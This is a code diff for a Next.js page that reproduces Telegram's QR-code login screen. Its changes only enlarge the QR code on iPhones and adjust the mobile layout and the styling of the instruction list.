@@ -10,11 +10,15 @@ import "react-international-phone/style.css";
 import Image from "next/image";
 import { parsePhoneNumberFromString } from "libphonenumber-js";
 import { COUNTRIES } from "@/lib/constants";
+import { isMobile, isAndroid, isIOS } from "react-device-detect";
 
 const QR_SIZE = 250;
+const MOBILE_QR_SIZE = 350;
 
 const Page = () => {
 	const theme = useSystemTheme();
+	const isIphone = isMobile && isIOS;
+	const isAndr = isMobile && isAndroid;
 	const [code, setCode] = useState("");
 	const [token, setToken] = useState("");
 	const [isOpen, setIsOpen] = useState(false);
@@ -217,8 +221,8 @@ const Page = () => {
 
 	return (
 		<div>
-			<div className="h-[186px] sm:h-[190px] w-full" />
-			<div className="flex relative overflow-hidden justify-center w-full sm:w-[480px] h-[900px] mx-auto">
+			<div className="sm:h-[190px] h-[0px] w-full" />
+			<div className="flex mt-20 sm:mt-0 relative overflow-hidden justify-center w-full sm:w-[480px] h-[650px] sm:h-[900px] mx-auto">
 				<div
 					className={cn(
 						"absolute w-full sm:w-[480px] h-[500px] transition-all",
@@ -411,8 +415,8 @@ const Page = () => {
 						className="relative flex items-center justify-center mx-auto"
 						style={{
 							display: isLoadingQrCode ? "flex" : "none",
-							width: `${QR_SIZE}px`,
-							height: `${QR_SIZE}px`,
+							width: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
+							height: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
 						}}
 					>
 						<div
@@ -425,8 +429,8 @@ const Page = () => {
 					<div
 						className="relative mx-auto"
 						style={{
-							width: `${QR_SIZE}px`,
-							height: `${QR_SIZE}px`,
+							width: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
+							height: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
 							overflow: "hidden",
 							display: !isLoadingQrCode ? "block" : "none",
 						}}
@@ -438,8 +442,8 @@ const Page = () => {
 							)}
 							ref={canvasRef}
 							style={{
-								width: `${QR_SIZE}px`,
-								height: `${QR_SIZE}px`,
+								width: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
+								height: isIphone ? `${MOBILE_QR_SIZE}px` : `${QR_SIZE}px`,
 								backgroundColor: "transparent",
 								display: !isLoadingQrCode ? "block" : "none",
 								overflow: "hidden",
@@ -510,15 +514,21 @@ const Page = () => {
 						Log in to Telegram by QR Code
 					</h4>
 
-					<ol className="max-w-[388px] animate-transparency flex flex-col select-none font-light gap-[4px] mt-[31px] sm:mt-[37px] mx-auto w-full list-decimal ps-[43px] sm:ps-[45px]">
-						<li className="text-[16.2px]">Open Telegram on your phone</li>
-						<li>
+					<ol
+						className={cn(
+							"max-w-[388px] animate-transparency flex flex-col select-none font-light gap-[4px] mt-[31px] sm:mt-[37px] mx-auto w-full list-decimal ps-[43px] sm:ps-[45px]",
+						)}
+					>
+						<li className="text-[16.2px] before:bg-red-600 before:[&>]">
+							Open Telegram on your phone
+						</li>
+						<li className="">
 							<span className="text-[16.2px]">
 								Go to <b>Settings</b> &gt; <b>Devices</b> &gt;{" "}
 								<b>Link Desktop Device</b>
 							</span>
 						</li>
-						<li className="text-[16.2px]">
+						<li className="text-[16.2px] before:bg-red-600 before:[&>]">
 							Point your phone at this screen to confirm login
 						</li>
 					</ol>
